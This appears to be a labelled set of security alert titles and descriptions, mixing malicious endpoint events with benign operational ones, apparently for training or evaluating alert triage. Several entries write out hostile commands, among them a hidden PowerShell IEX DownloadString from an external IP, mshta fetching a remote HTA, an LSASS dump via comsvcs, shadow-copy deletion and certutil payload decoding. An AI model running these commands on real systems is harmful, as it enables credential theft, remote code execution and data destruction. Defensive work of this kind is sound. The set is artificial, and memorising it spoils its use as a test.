title: Encoded PowerShell from Outlook child process
description: outlook.exe -> cmd.exe -> powershell.exe -enc JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0... Parent is Outlook reading an attachment. No signed-script policy exception.

title: certbot renewal job
description: Scheduled certbot renewal ran at 03:00 UTC, renewed the wildcard cert for *..fin, reloaded nginx. Exit 0. Matches the weekly cron and the change calendar.

title: GetNCChanges from non-DC account
description: Account svc_report@.fin issued a DsGetNCChanges replication request against APP-SRV-DC02. The account is a reporting service account with no Replicating Directory Changes right.

title: Self-service password reset
description: User klee@.fin reset their own password through the corporate self-service portal during business hours, from their assigned workstation, after answering MFA challenge. No anomalies.

title: rclone upload to mega.nz
description: rclone.exe (not in software inventory) transferred 4.1 GB to a mega.nz remote over 38 minutes from a Finance workstation. No DLP exception and rclone is not approved software.

title: WSUS patch install
description: Windows Update Agent installed 9 approved security updates from the internal WSUS server during the Tuesday maintenance window, then scheduled a reboot. Matches the patch ring policy.

title: vssadmin delete shadows
description: vssadmin.exe Delete Shadows /All /Quiet executed on the file server by an unknown parent binary svc_host32.exe located in C:\Users\Public. No backup job scheduled at this time.

title: Defender scheduled scan completed
description: Microsoft Defender completed a scheduled quick scan with 0 detections. Signatures current. Triggered by the standard daily task. Normal operational event.

title: LSASS memory read by comsvcs
description: rundll32.exe comsvcs.dll MiniDump <lsass-pid> dump.bin executed by a helpdesk account with no incident ticket. Output written to C:\Windows\Temp\d.bin.

title: Adobe ARM update
description: AdobeARMservice.exe, signed by Adobe Inc., downloaded and applied a Reader update over HTTPS from adobe.com. Matches the published update schedule and signature is valid.

title: Scheduled task with hidden DownloadString
description: Non-admin user registered scheduled task 'EdgeUpdaterHelper': powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://193.43.X.X/s2.ps1'). External IP, no business use.

title: Approved Salesforce export
description: User running the monthly finance report exported 12,000 rows from Salesforce to CSV through the sanctioned reporting tool, with a matching JIRA change ticket and manager approval on file.

title: mshta loading remote HTA
description: mshta.exe http://45.X.X.X/u.hta launched from a Word macro. The remote IP is not a  asset and the HTA reference is not in any allowlist. Parent is winword.exe from an emailed doc.

title: Backup service replication
description: The DPM backup service performed its nightly VSS-based replication of the application volumes to the backup target. Job 'NightlyApp' completed with exit 0, matching the backup schedule.

title: NTLMv1 authentication observed
description: Workstation authenticated to a file share using NTLMv1, which is disabled by domain policy. The downgrade pattern is consistent with an NTLM relay setup; source host is not the policy-exempt legacy device.

title: Teams login from corporate IP
description: User mgarcia@.fin signed into Microsoft Teams from the corporate VPN egress IP during their normal shift, MFA satisfied. Device is enrolled and compliant. Routine sign-in.

title: bcp export to external host
description: bcp.exe exported the Customers table to a file then xcopy moved it to \\203.X.X.X\share. The destination is outside the org's address space and there is no data-transfer ticket.

title: Chrome auto-update
description: GoogleUpdate.exe, signed by Google LLC, updated Chrome to the current stable channel over HTTPS. Matches the managed browser update policy. No user interaction, no anomalies.

title: certutil -decode of executable
description: powershell launched certutil.exe -decode payload.b64 payload.exe followed by execution of payload.exe from C:\Users\Public. Classic LOLBin payload staging; binary unsigned and unknown.

title: Log rotation job
description: logrotate compressed and rotated /var/log/nginx access and error logs at midnight, kept 14 days, signalled nginx to reopen handles. Exit 0. Standard cron-driven maintenance.

title: Impossible travel sign-in
description: Two interactive sessions for jthomas@.fin within 8 minutes: one from a Chicago IP, one from a Lagos IP. Physically impossible travel time; the Lagos session attempted access to the finance share.

title: USB device registered and approved
description: A registered, encrypted corporate USB drive assigned to the user was connected. Device is in the asset inventory and approved for the user's role. Routine, policy-compliant.

title: Admin account created by SYSTEM off-hours
description: A new account 'svc_helpdesk2' was created and added to Domain Admins by the SYSTEM context on the DC at 02:40, outside any change window and with no associated ticket.

title: Approved software install via SCCM
description: SCCM deployed and installed an approved version of 7-Zip to the workstation as part of the standard software baseline, with the deployment matching the approved collection. Routine.

title: WDigest re-enabled via registry
description: An unknown binary set HKLM\...\WDigest\UseLogonCredential = 1, which forces plaintext credentials into LSASS memory. No admin change ticket; common pre-credential-dump preparation step.

title: NTP time sync drift
description: w32time reported a 240ms offset from the domain time source and corrected it. Drift is below the alerting threshold; this is an informational operational event, not security-relevant.

title: SSH from non-VPN IP off-hours
description: svc_deploy authenticated over SSH to the jump host from an IP outside the VPN range at 03:12. The service account is not authorised for interactive jump-host access and the time is off-hours.

title: Printer driver update
description: The print spooler installed a vendor-signed driver update pushed by the managed print server, matching the approved driver package. Spooler restarted cleanly. Routine IT maintenance.

title: Excel macro spawning cmd
description: excel.exe executed Shell() to launch cmd.exe /c which then ran a base64 PowerShell, from a spreadsheet delivered by email. Macro-based initial access; document not from a trusted internal sender.

title: Monitoring agent heartbeat
description: The monitoring agent sent its 60-second heartbeat to the central collector over TLS. CPU, memory and disk metrics nominal. Standard telemetry, no security relevance.

title: Firewall rule added by non-admin
description: A non-administrative user added an inbound Windows Firewall rule permitting TCP 3389 from any address. Enabling unsolicited RDP is defence evasion / lateral-movement enablement; no ticket.

title: Approved RDP from jump host
description: An IT administrator connected via RDP from the approved, recorded jump host to a managed workstation during business hours, with a matching support ticket. Session recorded; routine support.
